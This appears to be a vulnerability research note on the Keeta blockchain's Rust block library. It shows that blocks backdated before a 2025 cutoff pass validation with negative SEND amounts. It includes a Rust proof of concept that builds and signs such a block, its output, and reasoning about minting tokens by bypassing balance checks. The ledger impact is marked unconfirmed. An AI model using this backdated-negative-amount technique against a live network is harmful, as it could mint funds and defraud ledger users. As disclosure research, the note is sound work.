# Keeta Block Cutoff Negative Amount — Dummy POC 2026-08-12

## Target
`keetanetwork-block` v0.4.1 — `validation.rs:164 cutoff=1763683200000 (2025-11-21T00:00:00Z)` + `operation/send.rs:26 guard_token_amount → OperationContext::validate_numeric → ValidationConfig::validate_numeric_value`

## Code
```rust
// validation.rs:208-217
pub fn validate_numeric_value(&self, value: &BigInt, block_date_ms: i64) -> Result<(), BlockError> {
    if *value >= BigInt::ZERO { return Ok(()); }
    if block_date_ms < self.numeric_cutoff_epoch_ms { return Ok(()); } // <2025-11-21 allows negative
    Err(BlockError::AmountBelowZero)
}
```

## Dummy POC — `/tmp/poc_negative_check`
```rust
use keetanetwork_block::{Amount, BlockBuilder, BlockTime, Hashable, Send};
use keetanetwork_account::KeyPairType;
use keetanetwork_block::testing::{generate_ed25519_ref, generate_identifier_ref};

let alice = generate_ed25519_ref(0xAA);
let bob = generate_ed25519_ref(0xBB);
let token = generate_identifier_ref(1, KeyPairType::TOKEN, 0);
let date_before = BlockTime::from_unix_millis(1717200000000).unwrap(); // 2024-06-01
let amount_neg = Amount::from(-1000000i64);

BlockBuilder::default()
    .with_network(0u8)
    .with_account(alice.clone())
    .with_date(date_before)
    .as_opening()
    .with_operation(Send{ to: bob.clone(), amount: amount_neg, token, external: None })
    .build().unwrap().sign().unwrap() // OK
// 2026-01-01 (1767225600000) same amount → Err(AmountBelowZero)
```

## Live Output
```
Alice: keeta_ahwdu46hors5phjzealnyqzbt7djs4wywisvmnwzza3jtn5i253s6lfailbra
Bob: keeta_afug3jj4qr5ec24bm4inqii7rofi7ibfxpnopk7tmocm7piykqpoxc33mxmvu
Token: keeta_aojtrnuoep6uaootcwopy2sliucxuxnvsviovc3bxavythh4djkcfvtyj7ksi
[BEFORE CUTOFF] BUILD OK SIGNED hash 3C12F10ACA660246F414F66A65B0A25EF90D014D7B2537C8EC1C20505533B3FB bytes 247
[AFTER CUTOFF] REJECTED AmountBelowZero
[POSITIVE CONTROL] OK
```

## Fix for POC compile errors
- `use keetanetwork_block::Send` not `operation::Send` (private mod)
- `use keetanetwork_block::Hashable` for `.hash()`
- `Amount::from(-1000000i64)` then `.as_bigint()`

## Why Not Fee
Fee is separate positive `Amount` via `fee_block` / `Client::create_vote_quote`. Negative SEND does `balance -= (-1e6) → +1e6` — supply ghost mint. Ledger-side `balance >= amount` check `amount=-1e6` always true → bypass.

## Status
Block validation PROVEN. Ledger execution NOT in node-rs (Rust side only validates, JS `keetanetwork-node` closed source does balance check). Needs live `test` rep `publish_staple` to confirm ledger accepts or rejects old-date negative SEND. Marked `BLOCKED → need live node` per Stall=Block.

## Cargo
```toml
[dependencies]
keetanetwork-block = { path = "/tmp/keeta_src/node-rs-main/keetanetwork-block", features = ["std","testing"] }
keetanetwork-account = { path = "/tmp/keeta_src/node-rs-main/keetanetwork-account", features = ["std"] }
keetanetwork-crypto = { path = "/tmp/keeta_src/node-rs-main/keetanetwork-crypto", features = ["std","signature"] }
```
